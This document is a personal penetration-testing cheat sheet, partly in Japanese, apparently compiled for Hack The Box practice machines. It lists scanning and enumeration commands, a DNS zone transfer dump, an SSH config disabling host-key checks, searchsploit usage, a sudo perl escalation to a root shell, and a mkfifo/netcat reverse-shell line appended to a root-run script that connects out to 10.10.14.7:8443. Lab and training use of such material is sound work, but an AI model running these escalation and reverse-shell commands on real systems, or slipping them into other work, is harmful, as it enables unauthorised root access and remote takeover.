
# My Cheat Sheet

## 探索

### nmap
```
nmap -sC -sV -O -v -oV 10.10.10.17
```

### nmap tips

https://muchipopo.com/ctf/cheatsheet-oscp/

### AutoRecon
```
┌──(kali㉿kali)-[~/Documents/Beep]
└─$ python3 ../AutoRecon/autorecon.py 10.10.10.7 
```

https://github.com/Tib3rius/AutoRecon

## ssh
ssh でエラーが出る場合  
```/etc/ssh/ssh_config```  

```
HOST *
KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
IgnoreUnknown UseKeychain,AddKeysToAgent
UseKeychain yes
AddKeysToAgent yes
Ciphers +3des-cbc,aes128-cbc,aes192-cbc,aes256-cbc
StrictHostKeyChecking no
UserKnownHostsFile /dev/null
HostKeyAlgorithms ssh-dss,ssh-rsa
PubkeyAcceptedAlgorithms +ssh-rsa
```
## DNS 53

```
└─$ dig axfr cronos.htb @10.10.10.13

; <<>> DiG 9.18.16-1-Debian <<>> axfr cronos.htb @10.10.10.13
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 235 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Dec 08 21:28:42 EST 2023
;; XFR size: 7 records (messages 1, bytes 203)

```

## http/https 

### http 探索
```
gobuster dir -u http://shocker.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**https** の場合は **-k** が必要

```
gobuster dir -u https://beep.htb/ -w /usr/share/wordlists/dirb/common.txt -k
```

```
feroxbuster -u http://shocker.htb -f -n
feroxbuster -u http://shocker.htb/cgi-bin/ -x sh,cgi,pl
```
```
dirb http://10.10.10.56/cgi-bin/ -X .sh,.pl,.txt,.php,.py
```

### WordPress
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```
### Word Press username 列挙
```
wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u
```

### Word Press admin page

```
https://brainfuck.htb/wp-admin/
```

## exploit code 

### searchsploit 検索
```
searchsploit wordpress plugin wp support
```

### searchsploit 詳細表示
```
searchsploit -x 41006.txt
```
### searchsploit Download
```
searchsploit -m 37637
```

### sudo -l
root 権限で実行できるファイルが確認できる
```
$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh <<<<< HERE
```

## root 権限

### perl -e 'exec "/bin/sh";'
https://gtfobins.github.io/gtfobins/perl/
```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
sudo perl -e 'exec "/bin/sh";'
whoami
root
```

### netcat /tmp/f
sudo -l で root 権限で実行できるファイルを見つけ、以下コマンドで netcat できるようにする。
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tmp/f' | tee -a monitor.sh
```

```
└─$ nc -lvnp 8443
listening on [any] 8443 ...
```

## Tips

### reverse_shells
https://gist.github.com/sckalath/67a59eb4955f1f9aedde

